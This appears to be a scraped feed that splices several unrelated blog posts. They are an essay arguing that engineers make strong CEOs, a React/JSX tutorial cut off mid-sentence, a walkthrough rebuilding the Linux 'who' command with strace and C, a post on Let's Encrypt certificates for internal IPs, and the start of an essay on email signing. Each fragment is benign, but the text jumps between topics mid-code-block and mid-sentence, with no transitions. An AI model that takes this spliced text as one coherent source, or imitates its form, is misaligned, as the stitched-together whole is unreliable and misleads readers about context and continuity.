      <p>I recently read a somehow controversial <a href="https://iism.org/article/why-are-ceos-failing-software-engineers-56">article</a> on why CEOs are failing software engineers. In the article, software management theorist <a href="https://twitter.com/GeneTBond">Gene Bond</a> argues that since business-educated CEOs only learn about financial and business management, they can't understand the creative management necessary to discover and realise new works of value.</p><blockquote>"<em>New value is a function of failure, not success; and, much of software engineering is about discovering new value. So, in effect, nearly everything [they] are taught as a business major or leader is seemingly incompatible with software engineering.</em>"</blockquote><p>But what if CEOs were former software engineers? Would they still fail the software engineers they lead? Data seems to show otherwise when you know that eight of the ten <a href="https://fxssi.com/most-valuable-tech-companies">most valuable technology companies</a> have <strong>CEOs who also are engineers</strong>. Jeff Bezos, the richest man in the world, was exposed to tech and coding at a <a href="https://twitter.com/JeffBezos/status/1058012110947373057?s=20">young age</a>. Bill Gates, the second richest, fell in love with programming at <a href="https://www.gatesnotes.com/About-Bill-Gates/Early-Days-as-a-Computer-Programmer">13 years old</a>, and Mark Zuckerberg, famously kept coding Facebook while being CEO for years. Still, the majority of software engineers think they can only become CTO and have little interest in business.</p><h3 id="top-performing-ceos-have-engineering-degrees"><strong>Top-performing CEOs have engineering degrees</strong></h3><p>Every year since 2014, the Harvard Business Review has published an <a href="https://hbr.org/2019/11/the-ceo-100-2019-edition#the-best-performing-ceos-in-the-world-2019">annual ranking</a> of the best-performing CEOs in the world and, for the past three years, there have been <strong>more CEOs with engineering degrees than MBAs</strong>, including this year's number one, NVIDIA CEO Jensen Huang. One likely explanation for this trend is the increase of technology CEOs on the list, as the industry has seen exponential growth in recent years. But maybe there's something else.</p><p>First of all, software engineers know how to set up the right environment for fellow developers because, well, they've been there. They know what developers <a href="https://www.joelonsoftware.com/2006/09/07/a-field-guide-to-developers/">look for in a job</a>. It's not surprising that <strong>twelve out of the twenty tech CEOs most favoured by their </strong><a href="https://www.glassdoor.com/Award/Top-CEOs-LST_KQ0,8.htm"><strong>employees</strong></a><strong> have an engineering background</strong> or coded at some point in their careers. As Stack Overflow and Trello founder Joel Sposkly <a href="https://www.joelonsoftware.com/2005/07/25/hitting-the-high-notes/">puts it</a>: "<em>building the company where the best software developers in the world would want to work [leads] to profits as naturally as chocolate leads to chubbiness or cartoon sex in video games leads to gangland-style shooting sprees</em>". After all, he did build two multi-million companies that considerably impacted the software ecosystem.</p><figure><img src="https://lh3.googleusercontent.com/oPXEuhoN05pnwuxbStZyMOftjkpqzRkpZdIxi2KImveOn3p8CL0VOEr7OGcuXQjFr0_MsfHaGx4QJ9ps3JSHJd8TXpv7dSUypZTTqf0jURKiGppNFiGi4aXfiLGbiJ9xBZAa6UwD" alt=""><figcaption>Joel Spolsky’s formula on how to build profitable software companies</figcaption></figure><p>I also believe that having a software engineering mindset, even if self-taught, allows CEOs to manage their companies very differently than financially focused peers.</p><h3 id="approaching-business-processes-like-programming-tasks"><strong>Approaching business processes like programming tasks</strong></h3><p>While Microsoft valuation hardly moved during Steve Ballmer's fourteen years tenure as CEO, it grew over 200 % since Satya Nadella took over in 2014. The difference? Steve Ballmer was a sales-oriented business school drop-out, while Nadella is a former software engineer turned executive.<br></p><figure><img src="https://lh6.googleusercontent.com/SCzxw685G5KsYSWFfNKU1WiU6J7yXXk1nZ-ZBMh-LpSe4gqKLKHwrLT6KCWZJl9bI2E7QHnssM1gCdMRRDVAuabgxYCNn9lQ9xLnbkSNTJ7vgMIhDM7sJecme7mGO_Wqhgxdatg4" alt=""><figcaption>Microsoft stock price under Satya Nadella - CB Insights<span>‌‌</span></figcaption></figure><p>So what does Nadella, and other engineers-turned-CEOs have in common? Well, suppose we take aside the ability to understand technology and have a long-term vision about it. In that case, I believe one of their key attributes is the ability to <strong>approach business processes like programming tasks</strong>.</p><p>Do you know what programmatic marketing, growth hacking and the lean startup have in common? They're all business methodologies that were created by engineers. They leverage <strong>logic and processes</strong> instead of intuition; they're <strong>data-driven</strong> and promote <strong>iterative experimentation</strong>. And, when you go beyond the buzzwords and watch the results, they're behind the wild success of tech companies like Dropbox and Slack (whose CEOs are, by the way, former developers).</p><p>Another trait of software engineers is their inclination to <strong>automate recurring and tedious tasks</strong>. As Bill Gates is known to say, "<em>I always choose a lazy person to do a hard job, because a lazy person will find an easy way to do it.</em>" And software engineers are known to be lazy. So, as CEOs, they're more likely to look for scalable solutions through automation, rather than merely hiring more human beings. Some CEOs take this thinking to another level like GitLab CEO Sid Sijbrandij, who started the company's famous <a href="https://about.gitlab.com/handbook/">handbook</a> because he didn't want to repeat himself for every batch of new hires.</p><p>What's even more interesting is when software engineers become CEOs of non-software companies. In this case, they run their firm like a software company, <strong>making software the cornerstone of their strategy</strong>, like Elon Musk with Tesla. One key component of electric automaker Tesla's success, as <a href="https://hbr.org/2020/02/lessons-from-teslas-approach-to-innovation">spotted</a> by Nathan Furr and Jeff Dyer, is that "<em>it introduced a new hardware and software architecture. For example, a Tesla has more software than the average vehicle and it is integrated around a single central software architecture. Although most gas-powered cars have software too, they typically have less software and operate on a different architecture making it more challenging to imitate Tesla's ability to update software and optimise vehicle performance.</em></p><p>Last but not least, they understand like Jeff Bezos that "<em>failure and invention are inseparable twins.</em>" In his famous <a href="https://www.sec.gov/Archives/edgar/data/1018724/000119312516530910/d168744dex991.htm">letters to shareholders</a>, Bezos often shares that what makes Amazon successful is their ability to accept the failed experiments necessary to get to invention.</p><blockquote>“<em>Outsized returns often come from betting against conventional wisdom, and conventional wisdom is usually right. Given a ten percent chance of a 100 times payoff, you should take that bet every time. But you’re still going to be wrong nine times out of ten [...] In business, every once in a while, when you step up to the plate, you can score 1,000 runs.</em>”</blockquote><h3 id="why-so-few-software-engineers-want-to-become-ceos"><strong>Why so few software engineers want to become CEOs</strong></h3><p>So if software engineers can become excellent CEOs, even in non-tech businesses, why so few of them make it to the top? According to a 2019 Forbes <a href="https://www.forbes.com/sites/kimberlywhitler/2019/10/05/new-ceo-study-the-undergraduate-degrees-and-majors-of-fortune-100-ceos/#623b360e4130">study</a>, still, 64% of F100 CEOs had a business-related undergraduate degree. I don't think it's just about software engineers' dislike for business. I believe it's also about how few of them consider the CEO position as a career choice.

<h2 id="basic-javascript-rendered-hello-world">Basic JavaScript-rendered Hello World</h2>
<p>Let's see how to render Hello World using basic javascript.</p>
<p>My HTML contains a single <code>div</code> with <code>id</code> as <code>root</code></p>
<pre><code><span>&lt;<span>div</span> <span>id</span>=<span>'root'</span>&gt;</span><span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>Now, I want to add <code>&lt;div class='container'&gt;Hello World&lt;/div&gt;</code> to that root div.</p>
<p>We can do that using javascript's document API. Let's see how</p>
<pre><code>
<span>const</span> rootElement = <span>document</span>.getElementById(<span>'root'</span>)


<span>const</span> divElement = <span>document</span>.createElement(<span>'div'</span>)
divElement.textContent = <span>'Hello World'</span>
divElement.className = <span>'container'</span>


rootElement.append(divElement)
</code></pre>
<p>What we are doing here is very simple.</p>
<ol>
<li>Get a reference to the actual DOM root element</li>
<li>Create a new div element using <code>document.createElement</code> and then set its class and textContent</li>
<li>Append this newly created element to the root div element.</li>
</ol>
<p>This produces the following HTML markup.</p>
<pre><code><span>&lt;<span>div</span> <span>id</span>=<span>'root'</span>&gt;</span>
    <span>&lt;<span>div</span> <span>class</span>=<span>'container'</span>&gt;</span>Hello World<span>&lt;/<span>div</span>&gt;</span>
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<h2 id="intro-to-raw-react-apis">Intro to raw React APIs</h2>
<p>Now let's try to use React's raw APIs to create markup that we need instead of (vanilla) javascript.</p>
<p>We need two important APIs to achieve our task. In vanilla javascript. they are:</p>
<pre><code><span>document</span>.createElement()
rootElement.append(domElement)
</code></pre>
<p>The React's equivalent of these two APIs are:</p>
<pre><code>React.createElement()
ReactDOM.render(reactElement, rootElement)
</code></pre>
<p>Let's see <code>React.createElement()</code> in more detail.</p>
<h3 id="reactcreateelement">React.createElement()</h3>
<p>This accepts three parameters</p>
<ol>
<li>Component or Tag to use to create the element</li>
<li>Props for the component</li>
<li>Children</li>
</ol>
<p>The API looks like <code>React.createElement(component, props, ...children)</code></p>
<p>So, to create an element like <code>&lt;div class='container'&gt;Hello World&lt;/div&gt;</code>, you would do </p>
<pre><code>React.createElement(<span>'div'</span>, { className: <span>'container'</span> }, <span>'Hello World'</span>)
</code></pre>
<p>Our HTML will have</p>
<pre><code><span>&lt;<span>div</span> <span>id</span>=<span>"root"</span>&gt;</span><span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>Now, to append <code>&lt;div class='container'&gt;Hello World&lt;/div&gt;</code> to the root element using React, we do:</p>
<pre><code><span>const</span> rootElement = <span>document</span>.getElementById(<span>'root'</span>)

<span>const</span> divElement = React.createElement(<span>'div'</span>, {className: <span>'container'</span>}, <span>'Hello World'</span>)

ReactDOM.render(divElement, rootElement)
</code></pre>
<p>Can you see how similar the React's API is to the normal vanilla js document API? </p>
<p>Note that, you can even create nested elements using this.</p>
<p>For example, let's try to create the following markup.</p>
<pre><code><span>&lt;<span>div</span> <span>class</span>=<span>'container'</span>&gt;</span>
    <span>&lt;<span>span</span>&gt;</span>Hello<span>&lt;/<span>span</span>&gt;</span>
    <span>&lt;<span>span</span>&gt;</span>World<span>&lt;/<span>span</span>&gt;</span>
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>To create the above markup</p>
<pre><code><span>const</span> rootElement = <span>document</span>.getElementById(<span>'root'</span>)

<span>const</span> helloElement = React.createElement(<span>'span'</span>, <span>null</span>, <span>'Hello'</span>)
<span>const</span> worldElement = React.createElement(<span>'span'</span>, <span>null</span>, <span>'World'</span>)
<span>const</span> divElement = React.createElement(<span>'div'</span>, {className: <span>'container'</span>}, helloElement, worldElement)

ReactDOM.render(divElement, rootElement)
</code></pre>
<p>You can even use a special <code>children</code> prop to add the children like the following</p>
<pre><code>React.createElement(<span>'div'</span>, {className: <span>'container'</span>, children: [helloElement, worldElement]})
</code></pre>
<p>The above code is same as the below code</p>
<pre><code>React.createElement(<span>'div'</span>, {className: <span>'container'</span>}, helloElement, worldElement)
</code></pre><h2 id="using-jsx">Using JSX</h2>
<p>If you have already been using React or saw the React code any time, you most probably would not have seen <code>React.createElement</code> being used. Instead, you might have seen some code that looks similar to HTML. Let's see what it is.</p>
<p>JSX is HTML-like syntactic sugar on top of raw React APIs. </p>
<p>Let's see an example.</p>
<pre><code><span>const</span> divElement = <span><span>&lt;<span>div</span> <span>id</span>=<span>'container'</span>&gt;</span>Hello World<span>&lt;/<span>div</span>&gt;</span></span>
</code></pre>
<p>The above code is equivalent to </p>
<pre><code><span>const</span> divElement = React.createElement(<span>'div'</span>, {id: <span>'container'</span>}, <span>'Hello World'</span>)
</code></pre>
<p>But JSX is not a valid javascript code, so we use a compiler called <code>Babel</code> to convert JSX code to its corresponding <code>React.createElement</code> code.</p>
<p>Now, let's see how easy it is to create the following markup using JSX.</p>
<pre><code><span>&lt;<span>div</span> <span>class</span>=<span>'container'</span>&gt;</span>
    <span>&lt;<span>span</span>&gt;</span>Hello<span>&lt;/<span>span</span>&gt;</span>
    <span>&lt;<span>span</span>&gt;</span>World<span>&lt;/<span>span</span>&gt;</span>
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<pre><code><span>const</span> rootElement = <span>document</span>.getElementById(<span>'root'</span>)

<span>const</span> divElement = <span><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span><span>&lt;<span>span</span>&gt;</span>Hello<span>&lt;/<span>span</span>&gt;</span><span>&lt;<span>span</span>&gt;</span>World<span>&lt;/<span>span</span>&gt;</span><span>&lt;/<span>div</span>&gt;</span>

ReactDOM.render(divElement, rootElement)</span>
</code></pre>
<p>Note that there are some subtle differences between JSX and HTML. </p>
<p>For example, in HTML to add class to an element, we add it like <code>class='container'</code>, whereas in JSX, we need to write <code>className='container'</code>. </p>
<p>There are some other differences when using JSX which I will explain later in the post.</p>
<h2 id="interpolation-in-jsx">Interpolation in JSX</h2>
<p>Since JSX is written in javascript itself, there are some very interesting things which you can do. One of those is using JSX interpolation. It basically gives us the ability to use javascript inside of JSX. Whenever you do interpolation, you would surround it with <code>{</code> and <code>}</code>. This tells the Babel compiler that interpolation is being used here.</p>
<p>For example, take the following code</p>
<pre><code><span>const</span> divElement = <span><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span>Hello World<span>&lt;/<span>div</span>&gt;</span></span>
</code></pre>
<p>Now, you want the class name and text content to be dynamic, you can do something like</p>
<pre><code><span>const</span> divClassName = <span>'container'</span>
<span>const</span> divTextContent = <span>'Hello World'</span>

<span>const</span> divElement = <span><span>&lt;<span>div</span> <span>className</span>=<span>{divClassName}</span>&gt;</span>{divTextContent}<span>&lt;/<span>div</span>&gt;</span></span>
</code></pre>
<p>Can you see the flexibility that interpolation gives us? </p>
<h3 id="conditionals-and-loops">Conditionals and Loops</h3>
<p>You can even add conditionals and loops in JSX</p>
<pre><code>{ condition ? <span><span>&lt;<span>div</span>&gt;</span>Hello World<span>&lt;/<span>div</span>&gt;</span> : <span>&lt;<span>div</span>&gt;</span>Goodbye World<span>&lt;/<span>div</span>&gt;</span> }</span>
</code></pre>
<p>As you can see above, to use conditionals in JSX, you would make use of the tertiary operator.</p>
<pre><code>{items.map((item) =&gt; <span><span>&lt;<span>div</span> <span>key</span>=<span>{item.id}</span>&gt;</span>{item.title}<span>&lt;/<span>div</span>&gt;</span>)</span>}
</code></pre>
<p>To use loops, you will use the <code>map</code> function.</p>
<p>You can even use template literals in JSX like</p>
<pre><code><span>const</span> element = <span><span>&lt;<span>div</span> <span>id</span>=<span>{`item-${itemId}`}</span>&gt;</span>{itemContent}<span>&lt;/<span>div</span>&gt;</span></span>
</code></pre>
<p>To learn more about JSX, head over to <a target="_blank" href="https://reactjs.org/docs/jsx-in-depth.html">JSX in Depth</a> - React's official docs</p>
<h2 id="creating-custom-components">Creating custom components</h2>
<p>Consider the following JSX code</p>
<pre><code><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span>
  <span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>Hello World<span>&lt;/<span>div</span>&gt;</span>
  <span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>Goodbye World<span>&lt;/<span>div</span>&gt;</span>
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>Here you can see the code <code>&lt;div className='message'&gt;&lt;/div&gt;</code> is duplicated at two places.</p>
<p>To avoid duplication, the simplest thing we can do is to create a function and then call it instead.</p>
<pre><code><span><span>function</span> <span>message</span>(<span>text</span>) </span>{
    <span>return</span> <span><span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>{text}<span>&lt;/<span>div</span>&gt;</span>
}</span>
</code></pre>
<pre><code><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span>
    {message('Hello World')}
    {message('Goodbye World')}
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>Let's refactor this a bit.</p>
<pre><code><span><span>function</span> <span>message</span>(<span>{children}</span>) </span>{
    <span>return</span> <span><span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>{children}<span>&lt;/<span>div</span>&gt;</span>
}</span>
</code></pre>
<pre><code><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span>
    {message({children: 'Hello World'})}
    {message({children: 'Goodbye World'})}
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>Let's refactor this even more to use React.createElement</p>
<pre><code><span><span>function</span> <span>message</span>(<span>{children}</span>) </span>{
    <span>return</span> <span><span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>{children}<span>&lt;/<span>div</span>&gt;</span>
}</span>
</code></pre>
<pre><code><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span>
    {React.createElement(message, null, 'Hello World')}
    {React.createElement(message, null, 'Goodbye World')}
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>Previously in all the examples that we have seen, the first argument of React.createElement() is a string like 'span' or 'div'.</p>
<p>But React.createElement also accepts a function that returns something renderable like JSX, some string, number etc.</p>
<p>That's why the above code works.</p>
<p>Now, let's convert the above code to JSX</p>
<pre><code><span><span>function</span> <span>message</span>(<span>{children}</span>) </span>{
    <span>return</span> <span><span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>{children}<span>&lt;/<span>div</span>&gt;</span>
}</span>
</code></pre>
<pre><code><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span>
    <span>&lt;<span>message</span>&gt;</span>Hello World<span>&lt;/<span>message</span>&gt;</span>
    <span>&lt;<span>message</span>&gt;</span>Goodbye World<span>&lt;/<span>message</span>&gt;</span>
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>The above code seems to be perfect, right? Actually it's not. The above code will not work as intended. The reason being how babel compiles the JSX code to it's corresponding React.createElement() code.</p>
<p><code>&lt;message /&gt;</code> is compiled by babel to <code>React.createElement('message')</code>. But what we want is <code>React.createElement(message)</code>. In the first case, the first argument is a string, in the second case, it's a function.</p>
<p>For the babel to convert it into what we needed, we have to make the <code>message</code> function name uppercase.</p>
<pre><code><span><span>function</span> <span>Message</span>(<span>{children}</span>) </span>{
    <span>return</span> <span><span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>{children}<span>&lt;/<span>div</span>&gt;</span>
}</span>
</code></pre>
<pre><code><span>&lt;<span>div</span> <span>className</span>=<span>'container'</span>&gt;</span>
    <span>&lt;<span>Message</span>&gt;</span>Hello World<span>&lt;/<span>Message</span>&gt;</span>
    <span>&lt;<span>Message</span>&gt;</span>Goodbye World<span>&lt;/<span>Message</span>&gt;</span>
<span>&lt;/<span>div</span>&gt;</span>
</code></pre>
<p>Now, this <code>&lt;Message&gt;Hello World&lt;/Message&gt;</code> will be compiled to <code>React.createElement(Message, {children: 'Hello World'})</code>, which is exactly what we needed.</p>
<p>Check the below examples to see how Babel compiles each of the JSX formats.</p>
<table>
<thead>
<tr>
<td>JSX</td><td>React.createElement()</td></tr>
</thead>
<tbody>
<tr>
<td><code>&lt;Capitalized /&gt;</code></td><td><code>React.createElement(Capitalized)</code></td></tr>
<tr>
<td><code>&lt;property.access /&gt;</code></td><td><code>React.createElement(property.access)</code></td></tr>
<tr>
<td><code>&lt;Property.Access /&gt;</code></td><td><code>React.createElement(Property.Access)</code></td></tr>
<tr>
<td><code>&lt;Property['Access'] /&gt;</code></td><td><code>SyntaxError</code></td></tr>
<tr>
<td><code>&lt;lowercase /&gt;</code></td><td><code>React.createElement('lowercase')</code></td></tr>
<tr>
<td><code>&lt;kebab-case /&gt;</code></td><td><code>React.createElement('kebab-case')</code></td></tr>
<tr>
<td><code>&lt;Upper-Kebab-Case /&gt;</code></td><td><code>React.createElement('Upper-Kebab-Case')</code></td></tr>
<tr>
<td><code>&lt;Upper_Snake_Case /&gt;</code></td><td><code>React.createElement(Upper_Snake_Case)</code></td></tr>
<tr>
<td><code>&lt;lower_snake_case /&gt;</code></td><td><code>React.createElement('lower_snake_case')</code></td></tr>
</tbody>
</table>
<p>So, we can see that the component name needs to be UpperCamelCased for it to work as intended.</p>
<h3 id="proptypes">PropTypes</h3>
<p>Let's slightly change the previous message component so that it accepts <code>name</code> prop.</p>
<pre><code><span><span>function</span> <span>Message</span>(<span>{name}</span>) </span>{
    <span>return</span> <span><span>&lt;<span>div</span> <span>className</span>=<span>'message'</span>&gt;</span>Hi, your name is {name}.<span>&lt;/<span>div</span>&gt;</span>
}</span>
</code></pre>
<pre><code><span>&lt;<span>Message</span> <span>name</span>=<span>'foo'</span> /&gt;</span>
<span>&lt;<span>Message</span> /&gt;</span>
</code></pre>
<p>This produces</p>
<pre><code>Hi, your name <span>is</span> foo.
Hi, your name <span>is</span> .
</code></pre><p>This doesn't look good. Does it? So what if there is a way we can enforce that the name needs to be passed and it needs to be a string.</p>
<p>Luckily, React gives us …</p></div></div>

gauthier pts/1        2020-08-30 15:06 (tmux(1555).%0)
gauthier pts/2        2020-08-30 16:41 (tmux(1555).%6)
gauthier pts/4        2020-08-30 15:57 (tmux(1555).%3)
</code></pre><p>It tells me that I am logged on the “physical” terminal <code>tty2</code> and on three pseudo terminals. Indeed my current session of Gnome Shell is running on <code>tty2</code> and I have 3 <code>tmux</code> windows open.</p><p>But where is it getting those information? Probably from a file as everything is a file with Linux, but let’s check which one and how the data is stored there.</p><h2 id="a-bit-of-reverse-engineering">A bit of reverse engineering</h2><p>In order to see what the <code>who</code> command is doing I could try to find the source code and dig into it. But I found it fun to use <code>strace</code> to check what the process was doing instead. Since we are expecting <code>who</code> to read system files, we can only focus on the <code>open</code> syscalls.</p><pre><code>$ strace who 2&gt;&amp;1 | grep open
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/lib/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/var/run/utmp", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/etc/localtime", O_RDONLY|O_CLOEXEC) = 3
</code></pre><p>We can quickly filter what is interesting and what is not. The first files two files <code>/etc/ld.so.cache</code>, <code>/usr/lib/libc.so.6</code> are shared libraries loaded by the process, those are interesting us.</p><p>Then <code>/usr/lib/locale/locale-archive</code>, <code>/var/run/utmp</code> and <code>/etc/localtime</code> are opened. Let’s see what those files are storing.</p><p>When exploring this kind of topics, it is always interesting to first search into the man pages before starting browsing the web. The 5th section of the manual is dedicated to “file formats and conventions” and seems a good place to start.</p><h3 id="locale-archive">locale-archive</h3><pre><code>$ man -wK 5 '/usr/lib/locale/locale-archive'
</code></pre><p>Sends us to <code>locale(5)</code> where we can read:</p><pre><code>The  locale  definition file contains all the information that the localedef(1) command needs to convert it into the binary locale data‐base.
</code></pre><p>The page also sends us to <code>locale(7)</code> for more explanation about those informations:</p><pre><code>A  locale is a set of language and cultural rules. These cover aspects such as language for messages, different character sets, lexico‐graphic conventions, and so on. A program needs to be able to determine its locale and act accordingly to be portable to different cultures.
</code></pre><p>So the <code>who</code> command read from this file, probably using the <code>setlocale(3)</code> function, to find out how the information should be formated and displayed.</p><p>We can actually check it:</p><pre><code>$ LC_ALL='fr_FR.utf8' who
gauthier tty2         Sep  2 11:38 (:1)
gauthier pts/1        Sep  2 12:11 (tmux(2445).%0)
gauthier pts/2        Sep  2 12:37 (tmux(2445).%1)
gauthier pts/3        Sep  2 13:04 (tmux(2445).%2)
</code></pre><p>Indeed, the date is is not formated the same way!</p><h3 id="localtime">localtime</h3><pre><code>$ man -wK 5 '/etc/localtime'
</code></pre><p>Sends us to <code>localtime(5)</code> which explains:</p><pre><code>The /etc/localtime file configures the system-wide timezone of the local system that is used by applications for presentation to the user.
</code></pre><p>Probably <code>who</code> uses this file (or uses a function that is using this file) to print timestamps (columns 4 and 5 of <code>who</code>'s output) using the correct timezone configured by the user.</p><h3 id="utmp">utmp</h3><p>Finally comes <code>/var/run/utmp</code>:</p><pre><code>$ man -wK 5 '/var/run/utmp'
/usr/share/man/man5/utmp.5.gz
</code></pre><p>Where we can read:</p><pre><code>The  utmp  file  allows  one to discover information about who is currently using the system.  There may be more users currently using the system, because not all programs use utmp logging.
</code></pre><p>Great! We found where the <code>who</code> command is getting its data. It would be nice to be able to read this file to get those data without using the <code>who</code> command. Unfortunately:</p><pre><code>The file is a sequence of utmp structures, declared as follows in &lt;utmp.h&gt; (note that this is only one of several definitions around; details depend on the version of libc):
</code></pre><p>At this point we understood what the <code>who</code> command is doing: it is reading <code>/var/run/utmp</code>, parsing the content and formating it nicely. Let’s see if we can reproduce this simple behavior.</p><h3 id="my-own-who">My own <code>who</code></h3><p>What we simply need to do is: open <code>/var/run/utmp</code>, read <code>n</code> bytes (where <code>n</code> is the size of the <code>utmp</code> structure), print the info contained in each structure, continue until we reach the end of the file. With a bit of formating, we can even make it look like the original <code>who</code> command.</p><pre><code>#include &lt;utmp.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;time.h&gt;

int main() {
  // set the right locale to display the information nicely
  setlocale(LC_ALL, "");

  // open the file
  FILE * file= fopen("/var/run/utmp", "rb");

  // just for safety
  if (file == NULL) {
    return 1;
  }

  // initialize the utmp structure
  struct utmp entry;

  // read the entries from the file one by one
  while (fread(&amp;entry, sizeof(struct utmp), 1, file) != 0) {
    if (entry.ut_type != USER_PROCESS)
      continue;

    // format the date (remember who uses the /etc/localtime?)
    char date[80];
    time_t raw_time = entry.ut_tv.tv_sec;
    struct tm *ts = localtime(&amp;raw_time);
    strftime(date, sizeof(date), "%Y-%m-%d %H:%M", ts);

    // print the output for this entry, tries to mock who's output
    printf("%-8s %-12s %s (%s)\n", entry.ut_user, entry.ut_line, date, entry.ut_host);
  }

  fclose(file);
}
</code></pre><pre><code>$ clang -o who who.c
$ ./who
gauthier tty2         2020-08-31 10:02 (tty2)
gauthier pts/1        2020-08-31 10:03 (tmux(2220).%0)
gauthier pts/2        2020-08-31 10:08 (tmux(2220).%1)
gauthier pts/3        2020-08-31 10:33 (tmux(2220).%5)
</code></pre><p>TADA!</p><p>We can also check with <code>strace</code> if the behavior is the same:</p><pre><code>$ strace ./who 2&gt;&amp;1 | grep -e open
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/lib/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/usr/lib/locale/locale-archive", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/var/run/utmp", O_RDONLY) = 3
openat(AT_FDCWD, "/etc/localtime", O_RDONLY|O_CLOEXEC) = 4
</code></pre><p>Indeed our program is doing the same as the original <code>who</code>.</p><p>Of course, this only mocks the most basic features of the <code>who</code> command and doesn’t handle any option, like the famous <code>who am i</code> or <code>who mom hates</code>.</p><h3 id="going-further">Going further</h3><p>There is still a lot to say about the <code>who</code> command. We could for example mention the <code>lastlog</code> command and its corresponding file <code>/var/log/wtmp</code>, dig into the <code>utmp</code> structure, or just try to understand what <code>utmp</code> stands for.</p></div></div>]]>

                <div>
                    <p>One of the issues I discovered while playing with microk8s Kubernetes setup locally was that many services and tools like <code>Kubernetes Dashboard</code> uses HTTPS for access and I don't want to use Self-Signed SSL certificates as it would require me installing these certificates in every device I use which would be a pain in the butt. So I was on the journey finding a way to have an SSL Certificate for my internal IP addresses. This article will document my journey of getting automatic SSL certificates for my internal microk8s Kubernetes setup.</p><h2 id="ssl-certificate-for-internal-ip-address">SSL Certificate for internal IP address?</h2><p>My first question was is there a way to get an SSL certificate from Public trusted Certificate Authority after looking at many free services like Let's Encrypt and similar services don't provide certificates to IP addresses, but only to domain names.</p><p>After discovering the issue with no way to get an SSL certificate for internal IP I was looking into other options for my problem. After racking my brains for a few minutes I had a question: Could I create a DNS A record for internal IP and would it work? A quick visit to my DNS control panel adding A record to the local IP address and visiting the domain name and seeing my local IP address served website I was amazed that it worked.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image.png 1000w, https://www.techprowd.com/content/images/2020/09/image.png 1212w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-1.png" alt=""></figure><p>Discovering that I can have a domain name for internal IP working I was surprised now I had curiosity if I will be able to use service like Let's Encrypt to generate an SSL Certificate for this domain name but if I remember correctly the Let's Encrypt requires external access to verify domain name ownership. Hmm, maybe there is a way to verify domain name ownership without external access? After some digging around Let's Encrypt documentation, I found that there many ways to verify domain ownership one of them is DNS plugins which have many DNS providers to automatically verify domains by modifying DNS records using API from those providers. In my case it is DigitalOcean.</p><p>Following <code>certbot-dns-digitalocean</code> <a href="https://certbot-dns-digitalocean.readthedocs.io/en/stable/">documentation</a>I tried to generate a certificate for internal IP but I ran into the issue that default macOS <code>certbot</code> installation from <code>brew install certbot</code> had no <code>certbot-dns-digitalocean</code> plugin available.</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>After a quick search online I found that DNS Plugins are not installed by default with <code>certbot</code>. I needed to install <code>certbox-dns-digitalocean</code> plugin using PIP</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>Afterward, I was able to generate a certificate without many issues:</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>Applying SSL certificate to local HTTPS server I was able to get HTTPS valid response from the internal IP address using a domain name</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-5.png" alt=""></figure><p>Now that I know that I can generate &amp; use an SSL certificate for internal IP address just by using a domain name.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>All forms of signing email are generally solving the wrong problem (a thesis)</h2>

	<p><small>August 30, 2020</small></p>
</div><div><p>Modern email is full of forms of signed email. Personally signed
email is the old fashioned approach (and wrong), but modern email
on the Internet is laced with things like <a href="https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail">DKIM</a>, which
have the sending system sign it to identify at least who sent it.
Unfortunately, the more I think about it, the more I feel that
signed email is generally solving the wrong problem (and if it's
solving the right one, we won't like that solution in the long run).</p>

<p>A while ago I wrote about <a href="https://utcc.utoronto.ca/~cks/space/blog/tech/EmailVsModernProtocols">why email often isn't as good as modern
protocols</a>, which is because it's what I
described as an <em>anonymous push</em> protocol. An anonymous push protocol
necessarily enables spam since it allows anyone to send you things.
Describing email as 'anonymous push' makes it sound like the anonymity
is the problem, which would make various forms of signing the
solution (including DKIM). But this isn't really what you care about
